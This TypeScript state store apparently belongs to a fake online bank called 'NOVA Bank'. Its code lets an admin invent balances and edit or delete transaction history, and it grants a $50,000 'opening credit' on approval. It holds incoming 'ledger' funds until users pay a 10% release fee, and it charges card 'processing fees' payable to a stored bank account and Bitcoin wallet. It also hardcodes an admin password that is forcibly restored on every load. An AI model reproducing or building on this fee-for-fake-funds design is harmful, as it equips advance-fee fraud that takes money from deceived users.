import { create } from "zustand";
import { persist } from "zustand/middleware";
import { hash, newAccountNumber, newTxnRef, randomDigits, randomId } from "./format";

export type Role = "user" | "admin";
export type AccountType = "Savings" | "Checking" | "Premium" | "Business";
export type AccountStatus = "pending" | "approved" | "suspended" | "rejected";
export type TxnType = "credit" | "debit";
export type TxnCategory =
  | "transfer" | "wire" | "deposit" | "fee" | "investment" | "loan" | "admin" | "savings" | "card";
export type TxnStatus = "completed" | "pending" | "failed";

export interface Transaction {
  id: string;
  type: TxnType;
  category: TxnCategory;
  amount: number;
  balanceBefore: number;
  balanceAfter: number;
  description: string;
  reference: string;
  counterparty: string;
  status: TxnStatus;
  timestamp: string;
}

export interface SavingsTxn {
  id: string;
  type: "credit" | "debit";
  amount: number;
  description: string;
  timestamp: string;
  balanceAfter: number;
}

export type CardTier = "Standard" | "Ruby" | "Platinum";
export const CARD_TIERS: Record<CardTier, { fee: number; limit: number }> = {
  Standard: { fee: 155, limit: 5_000 },
  Ruby:     { fee: 275, limit: 25_000 },
  Platinum: { fee: 400, limit: 100_000 },
};

export interface VirtualCard {
  id: string;
  tier: CardTier;
  number: string;
  cvv: string;
  pin: string;
  expiry: string;
  limit: number;
  createdAt: string;
  frozen?: boolean;
}

export type PendingKind = "ledger_release" | "virtual_card";
export type PendingStatus = "awaiting_fee" | "fee_paid" | "approved" | "rejected";

export interface PendingRequest {
  id: string;
  kind: PendingKind;
  status: PendingStatus;
  amount: number;        // for ledger_release: incoming amount; for virtual_card: 0
  fee: number;           // fee to be paid
  tier?: CardTier;       // virtual_card
  note?: string;
  createdAt: string;
}

export interface PayoutDetails {
  directDeposit?: string;   // bank account info text
  cryptoWallet?: string;    // wallet address text
  cryptoNetwork?: string;
}

export interface User {
  id: string;
  fullName: string;
  email: string;
  passwordHash: string;
  role: Role;
  accountNumber: string;
  accountType: AccountType;
  balance: number;
  ledgerBalance: number;
  savingsBalance: number;
  savingsTxns: SavingsTxn[];
  status: AccountStatus;
  pinHash: string;
  transactions: Transaction[];
  virtualCards: VirtualCard[];
  pendingRequests: PendingRequest[];
  payoutDetails?: PayoutDetails;
  savingsAccruedAt?: string;
  createdAt: string;
  lastLogin: string;
  cardFrozen?: boolean;
}

interface AuthState {
  currentUserId: string | null;
  pinFailures: number;
  pinLockUntil: number | null;
}

interface AppState extends AuthState {
  users: User[];
  notifications: Record<string, Notif[]>;
  globalPayoutDetails: PayoutDetails;

  register: (input: {
    fullName: string; email: string; password: string;
    accountType: AccountType; pin: string;
  }) => { ok: boolean; error?: string };
  login: (email: string, password: string) => { ok: boolean; error?: string };
  logout: () => void;
  verifyPin: (pin: string) => { ok: boolean; error?: string };
  updateUser: (id: string, patch: Partial<User>) => void;
  addTransaction: (userId: string, t: Omit<Transaction, "id" | "reference" | "timestamp" | "balanceBefore" | "balanceAfter">) => Transaction | null;
  editTransaction: (userId: string, txnId: string, patch: Partial<Transaction>) => void;
  deleteTransaction: (userId: string, txnId: string) => void;
  approveUser: (id: string) => void;
  rejectUser: (id: string) => void;
  suspendUser: (id: string) => void;
  reinstateUser: (id: string) => void;
  fundAccount: (id: string, amount: number) => void;
  debitAccount: (id: string, amount: number, description: string) => void;

    // Ledger / fee flow
    fundLedger: (id: string, amount: number, note?: string) => void;
    markFeePaid: (userId: string, reqId: string) => void;
    approveRequest: (userId: string, reqId: string) => void;
    rejectRequest: (userId: string, reqId: string) => void;

    // Virtual cards
    requestVirtualCard: (userId: string, tier: CardTier) => void;
    freezeVirtualCard: (userId: string, cardId: string, frozen: boolean) => void;

    // Payout details
    setUserPayoutDetails: (userId: string, details: PayoutDetails) => void;
    setGlobalPayoutDetails: (details: PayoutDetails) => void;

    // Savings
    depositToSavings: (userId: string, amount: number) => { ok: boolean; error?: string };
    withdrawFromSavings: (userId: string, amount: number) => { ok: boolean; error?: string };
    accrueSavingsInterest: (userId: string) => void;

  pushNotif: (userId: string, n: Omit<Notif, "id" | "createdAt" | "read">) => void;
  markNotifRead: (userId: string, id: string) => void;
  deleteNotif: (userId: string, id: string) => void;
  markAllRead: (userId: string) => void;
  changePin: (userId: string, oldPin: string, newPin: string) => { ok: boolean; error?: string };
}

export interface Notif {
  id: string;
  title: string;
  body: string;
  kind: "success" | "info" | "warning" | "error";
  createdAt: string;
  read: boolean;
  txnId?: string;
  requestId?: string;
}

export const SAVINGS_APY = 0.04;

const ensureUserShape = (u: Partial<User>): User => ({
  id: u.id ?? randomId(),
  fullName: u.fullName ?? "",
  email: u.email ?? "",
  passwordHash: u.passwordHash ?? "",
  role: u.role ?? "user",
  accountNumber: u.accountNumber ?? newAccountNumber(),
  accountType: u.accountType ?? "Savings",
  balance: u.balance ?? 0,
  ledgerBalance: u.ledgerBalance ?? 0,
  savingsBalance: u.savingsBalance ?? 0,
  savingsTxns: u.savingsTxns ?? [],
  status: u.status ?? "pending",
  pinHash: u.pinHash ?? hash("0000"),
  transactions: u.transactions ?? [],
  virtualCards: u.virtualCards ?? [],
  pendingRequests: u.pendingRequests ?? [],
  payoutDetails: u.payoutDetails,
  savingsAccruedAt: u.savingsAccruedAt,
  createdAt: u.createdAt ?? new Date().toISOString(),
  lastLogin: u.lastLogin ?? new Date().toISOString(),
  cardFrozen: u.cardFrozen,
});

const seedAdmin = (): User => ensureUserShape({
  id: "admin-root",
  fullName: "Master Control",
  email: "admin@novabank.com",
  passwordHash: hash("Admin@2025"),
  role: "admin",
  accountNumber: "NOVA-0000000001",
  accountType: "Premium",
  balance: 0,
  status: "approved",
  pinHash: hash("0000"),
});

const generateCard = (tier: CardTier): VirtualCard => {
  const number = `4${randomDigits(15)}`.replace(/(.{4})/g, "$1 ").trim();
  const now = new Date();
  const exp = new Date(now.getFullYear() + 4, now.getMonth());
  return {
    id: randomId(),
    tier,
    number,
    cvv: randomDigits(3),
    pin: randomDigits(4),
    expiry: `${String(exp.getMonth() + 1).padStart(2, "0")}/${String(exp.getFullYear()).slice(-2)}`,
    limit: CARD_TIERS[tier].limit,
    createdAt: now.toISOString(),
  };
};

export const useStore = create<AppState>()(
  persist(
    (set, get) => ({
      users: [seedAdmin()],
      notifications: {},
            globalPayoutDetails: {
        directDeposit: "NOVA Holdings • Routing 026073150 • Acct 8821-559014",
        cryptoWallet: "bc1qx2v8nova7demo9wallet0addrxxxxxxxxxxxx",
        cryptoNetwork: "Bitcoin (BTC)",
      },
      currentUserId: null,
      pinFailures: 0,
      pinLockUntil: null,

      register: ({ fullName, email, password, accountType, pin }) => {
        const exists = get().users.some(u => u.email.toLowerCase() === email.toLowerCase());
        if (exists) return { ok: false, error: "Email already registered" };
        const user = ensureUserShape({
          fullName, email,
          passwordHash: hash(password),
          role: "user",
          accountType,
          pinHash: hash(pin),
          status: "pending",
        });
        set(s => ({ users: [...s.users, user] }));
        return { ok: true };
      },

      login: (email, password) => {
        const u = get().users.find(u => u.email.toLowerCase() === email.toLowerCase());
        if (!u) return { ok: false, error: "Account not found" };
        if (u.passwordHash !== hash(password)) return { ok: false, error: "Incorrect password" };
        if (u.status === "rejected") return { ok: false, error: "Application rejected" };
        set({ currentUserId: u.id, pinFailures: 0, pinLockUntil: null });
        get().updateUser(u.id, { lastLogin: new Date().toISOString() });
        get().accrueSavingsInterest(u.id);
        return { ok: true };
      },

      logout: () => set({ currentUserId: null, pinFailures: 0, pinLockUntil: null }),

      verifyPin: (pin) => {
        const { currentUserId, users, pinFailures, pinLockUntil } = get();
        if (pinLockUntil && Date.now() < pinLockUntil) {
          const s = Math.ceil((pinLockUntil - Date.now()) / 1000);
          return { ok: false, error: `Locked. Try again in ${s}s` };
        }
        const u = users.find(x => x.id === currentUserId);
        if (!u) return { ok: false, error: "No session" };
        if (u.pinHash !== hash(pin)) {
          const nf = pinFailures + 1;
          if (nf >= 3) {
            set({ pinFailures: 0, pinLockUntil: Date.now() + 30_000 });
            return { ok: false, error: "Locked for 30s after 3 failed attempts" };
          }
          set({ pinFailures: nf });
          return { ok: false, error: `Wrong PIN (${3 - nf} left)` };
        }
        set({ pinFailures: 0, pinLockUntil: null });
        return { ok: true };
      },

      updateUser: (id, patch) =>
        set(s => ({ users: s.users.map(u => u.id === id ? { ...u, ...patch } : u) })),

      addTransaction: (userId, t) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return null;
        const balanceBefore = u.balance;
        const delta = t.type === "credit" ? t.amount : -t.amount;
        const balanceAfter = balanceBefore + delta;
        if (t.type === "debit" && balanceAfter < 0 && t.status === "completed") return null;
        const txn: Transaction = {
          ...t,
          id: randomId(),
          reference: newTxnRef(),
          timestamp: new Date().toISOString(),
          balanceBefore,
          balanceAfter: t.status === "completed" ? balanceAfter : balanceBefore,
        };
        get().updateUser(userId, {
          balance: t.status === "completed" ? balanceAfter : balanceBefore,
          transactions: [txn, ...u.transactions],
        });
        return txn;
      },

      editTransaction: (userId, txnId, patch) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        const txns = u.transactions.map(t => t.id === txnId ? { ...t, ...patch } : t);
        get().updateUser(userId, { transactions: txns });
      },

      deleteTransaction: (userId, txnId) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        get().updateUser(userId, { transactions: u.transactions.filter(t => t.id !== txnId) });
      },

      approveUser: (id) => {
        const u = get().users.find(x => x.id === id);
        if (!u) return;
        get().updateUser(id, { status: "approved" });
        get().addTransaction(id, {
          type: "credit", category: "admin", amount: 50000,
          description: "Account opening credit", counterparty: "NOVA Bank",
          status: "completed",
        });
        get().pushNotif(id, {
          title: "Account approved",
          body: "Welcome to NOVA. $50,000 opening credit applied.",
          kind: "success",
        });
      },
      rejectUser: (id) => get().updateUser(id, { status: "rejected" }),
      suspendUser: (id) => get().updateUser(id, { status: "suspended" }),
      reinstateUser: (id) => get().updateUser(id, { status: "approved" }),

      fundAccount: (id, amount) => {
        get().addTransaction(id, {
          type: "credit", category: "admin", amount,
          description: "Admin credit", counterparty: "NOVA Admin",
          status: "completed",
        });
        get().pushNotif(id, {
          title: "Account funded",
          body: `Your account was credited.`,
          kind: "success",
        });
      },
      debitAccount: (id, amount, description) => {
        get().addTransaction(id, {
          type: "debit", category: "admin", amount,
          description, counterparty: "NOVA Admin",
          status: "completed",
        });
      },

      fundLedger: (id, amount, note) => {
        const u = get().users.find(x => x.id === id);
        if (!u) return;
        const fee = Math.round(amount * 0.1 * 100) / 100;
        const req: PendingRequest = {
          id: randomId(), kind: "ledger_release", status: "awaiting_fee",
          amount, fee, note, createdAt: new Date().toISOString(),
        };
        get().updateUser(id, {
          ledgerBalance: u.ledgerBalance + amount,
          pendingRequests: [req, ...u.pendingRequests],
        });
        get().pushNotif(id, {
          title: "Incoming funds in ledger",
          body: `$${amount.toLocaleString()} pending. Pay 10% fee ($${fee.toLocaleString()}) to release.`,
          kind: "info",
          requestId: req.id,
        });
      },

      markFeePaid: (userId, reqId) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        get().updateUser(userId, {
          pendingRequests: u.pendingRequests.map(r => r.id === reqId ? { ...r, status: "fee_paid" as PendingStatus } : r),
        });
        get().pushNotif(userId, {
          title: "Fee payment submitted",
          body: "Awaiting admin verification.",
          kind: "info",
          requestId: reqId,
        });
      },

      approveRequest: (userId, reqId) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        const req = u.pendingRequests.find(r => r.id === reqId);
        if (!req) return;

        if (req.kind === "ledger_release") {
          // Move from ledger to main balance
          const newLedger = Math.max(0, u.ledgerBalance - req.amount);
          get().updateUser(userId, { ledgerBalance: newLedger });
          get().addTransaction(userId, {
            type: "credit", category: "deposit", amount: req.amount,
            description: req.note || "Incoming transfer released", counterparty: "NOVA Clearing",
            status: "completed",
          });
          get().pushNotif(userId, {
            title: "Funds released",
            body: `$${req.amount.toLocaleString()} credited to your main balance.`,
            kind: "success",
          });
        } else if (req.kind === "virtual_card" && req.tier) {
          const card = generateCard(req.tier);
          get().updateUser(userId, { virtualCards: [card, ...u.virtualCards] });
          get().pushNotif(userId, {
            title: `${req.tier} card issued`,
            body: `Your new virtual card ending ${card.number.slice(-4)} is ready.`,
            kind: "success",
          });
        }

        // mark approved
        const fresh = get().users.find(x => x.id === userId);
        if (fresh) {
          get().updateUser(userId, {
            pendingRequests: fresh.pendingRequests.map(r => r.id === reqId ? { ...r, status: "approved" as PendingStatus } : r),
          });
        }
      },

      rejectRequest: (userId, reqId) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        const req = u.pendingRequests.find(r => r.id === reqId);
        if (!req) return;
        // For ledger_release, refund the ledger balance entry (remove pending amount)
        const patch: Partial<User> = {
          pendingRequests: u.pendingRequests.map(r => r.id === reqId ? { ...r, status: "rejected" as PendingStatus } : r),
        };
        if (req.kind === "ledger_release") {
          patch.ledgerBalance = Math.max(0, u.ledgerBalance - req.amount);
        }
        get().updateUser(userId, patch);
        get().pushNotif(userId, {
          title: "Request rejected",
          body: req.kind === "ledger_release" ? "Ledger release was rejected by admin." : "Card request was rejected.",
          kind: "warning",
          requestId: reqId,
        });
      },

      requestVirtualCard: (userId, tier) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        const fee = CARD_TIERS[tier].fee;
        const req: PendingRequest = {
          id: randomId(), kind: "virtual_card", tier, status: "awaiting_fee",
          amount: 0, fee, createdAt: new Date().toISOString(),
        };
        get().updateUser(userId, { pendingRequests: [req, ...u.pendingRequests] });
        get().pushNotif(userId, {
          title: `${tier} card requested`,
          body: `Pay $${fee} processing fee to issue your card.`,
          kind: "info",
          requestId: req.id,
        });
      },

      freezeVirtualCard: (userId, cardId, frozen) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        get().updateUser(userId, {
          virtualCards: u.virtualCards.map(c => c.id === cardId ? { ...c, frozen } : c),
        });
      },

      setUserPayoutDetails: (userId, details) => {
        get().updateUser(userId, { payoutDetails: details });
      },
      setGlobalPayoutDetails: (details) => set({ globalPayoutDetails: details }),

      depositToSavings: (userId, amount) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return { ok: false, error: "No user" };
        if (amount <= 0) return { ok: false, error: "Invalid amount" };
        if (u.balance < amount) return { ok: false, error: "Insufficient main balance" };
        get().accrueSavingsInterest(userId);
        const fresh = get().users.find(x => x.id === userId)!;
        const newSavings = fresh.savingsBalance + amount;
        const newMain = fresh.balance - amount;
        const stxn: SavingsTxn = {
          id: randomId(), type: "credit", amount,
          description: "Deposit from main", timestamp: new Date().toISOString(),
          balanceAfter: newSavings,
        };
        get().updateUser(userId, {
          balance: newMain,
          savingsBalance: newSavings,
          savingsTxns: [stxn, ...fresh.savingsTxns],
          savingsAccruedAt: new Date().toISOString(),
        });
        get().addTransaction(userId, {
          type: "debit", category: "savings", amount,
          description: "Transfer to Savings", counterparty: "NOVA Savings",
          status: "completed",
        });
        return { ok: true };
      },

      withdrawFromSavings: (userId, amount) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return { ok: false, error: "No user" };
        if (amount <= 0) return { ok: false, error: "Invalid amount" };
        get().accrueSavingsInterest(userId);
        const fresh = get().users.find(x => x.id === userId)!;
        if (fresh.savingsBalance < amount) return { ok: false, error: "Insufficient savings" };
        const newSavings = fresh.savingsBalance - amount;
        const stxn: SavingsTxn = {
          id: randomId(), type: "debit", amount,
          description: "Withdrawal to main", timestamp: new Date().toISOString(),
          balanceAfter: newSavings,
        };
        get().updateUser(userId, {
          savingsBalance: newSavings,
          savingsTxns: [stxn, ...fresh.savingsTxns],
          savingsAccruedAt: new Date().toISOString(),
        });
        get().addTransaction(userId, {
          type: "credit", category: "savings", amount,
          description: "Transfer from Savings", counterparty: "NOVA Savings",
          status: "completed",
        });
        return { ok: true };
      },

      accrueSavingsInterest: (userId) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return;
        if (u.savingsBalance <= 0) {
          if (!u.savingsAccruedAt) get().updateUser(userId, { savingsAccruedAt: new Date().toISOString() });
          return;
        }
        const last = u.savingsAccruedAt ? new Date(u.savingsAccruedAt).getTime() : Date.now();
        const days = (Date.now() - last) / (1000 * 60 * 60 * 24);
        if (days < 0.001) return;
        const interest = u.savingsBalance * SAVINGS_APY * (days / 365);
        if (interest < 0.01) {
          get().updateUser(userId, { savingsAccruedAt: new Date().toISOString() });
          return;
        }
        const newSavings = u.savingsBalance + interest;
        const stxn: SavingsTxn = {
          id: randomId(), type: "credit", amount: interest,
          description: `Interest @ ${(SAVINGS_APY * 100).toFixed(2)}% APY`,
          timestamp: new Date().toISOString(),
          balanceAfter: newSavings,
        };
        get().updateUser(userId, {
          savingsBalance: newSavings,
          savingsTxns: [stxn, ...u.savingsTxns],
          savingsAccruedAt: new Date().toISOString(),
        });
      },

      pushNotif: (userId, n) =>
        set(s => ({
          notifications: {
            ...s.notifications,
            [userId]: [
              { ...n, id: randomId(), createdAt: new Date().toISOString(), read: false },
              ...(s.notifications[userId] ?? []),
            ],
          },
        })),
      markNotifRead: (userId, id) =>
        set(s => ({
          notifications: {
            ...s.notifications,
            [userId]: (s.notifications[userId] ?? []).map(n => n.id === id ? { ...n, read: true } : n),
          },
        })),
      deleteNotif: (userId, id) =>
        set(s => ({
          notifications: {
            ...s.notifications,
            [userId]: (s.notifications[userId] ?? []).filter(n => n.id !== id),
          },
        })),
      markAllRead: (userId) =>
        set(s => ({
          notifications: {
            ...s.notifications,
            [userId]: (s.notifications[userId] ?? []).map(n => ({ ...n, read: true })),
          },
        })),
      changePin: (userId, oldPin, newPin) => {
        const u = get().users.find(x => x.id === userId);
        if (!u) return { ok: false, error: "No user" };
        if (u.pinHash !== hash(oldPin)) return { ok: false, error: "Current PIN incorrect" };
        if (!/^\d{4}$/.test(newPin)) return { ok: false, error: "PIN must be 4 digits" };
        get().updateUser(userId, { pinHash: hash(newPin) });
        return { ok: true };
      },
    }),
    {
      name: "nova-bank-store",
      partialize: (s) => ({
        users: s.users,
        notifications: s.notifications,
        currentUserId: s.currentUserId,
        globalPayoutDetails: s.globalPayoutDetails,
      }),
      merge: (persisted, current) => {
        const p = (persisted ?? {}) as Partial<AppState>;
        const usersRaw = Array.isArray(p.users) ? p.users : [];
        const users = usersRaw.map(u => ensureUserShape(u));
        const hasAdmin = users.some(u => u.role === "admin" && u.email.toLowerCase() === "admin@novabank.com");
        return {
          ...current,
          ...p,
          users: hasAdmin
            ? users.map(u => u.email.toLowerCase() === "admin@novabank.com"
                ? { ...u, passwordHash: hash("Admin@2025"), status: "approved", role: "admin" }
                : u)
            : [seedAdmin(), ...users],
        };
      },
    }
  )
);

export const useCurrentUser = () => {
  const id = useStore(s => s.currentUserId);
  return useStore(s => s.users.find(u => u.id === id) ?? null);
};
